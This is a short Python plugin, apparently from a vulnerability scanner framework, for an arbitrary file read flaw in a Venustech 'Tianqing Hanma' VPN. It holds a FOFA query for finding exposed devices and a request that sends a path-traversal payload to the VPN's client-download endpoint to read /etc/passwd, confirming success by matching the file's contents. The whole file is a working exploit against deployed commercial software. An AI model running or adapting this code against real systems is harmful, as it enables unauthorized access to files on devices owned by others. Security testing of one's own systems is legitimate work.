#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/frfUiXUCNP7NJGIlKxMngw',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '启明星辰天青汉马VPN-download-client-任意文件读取',

      'level'     :   'high',

      'FOFA'      :   'app="网御星云-VPN" || (body="select_auth_method" && body="select_auth_input")||app="启明星辰-天清汉马VPN"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/7/17',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/vpn/user/download/client?ostype=../../../../../../../etc/passwd'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret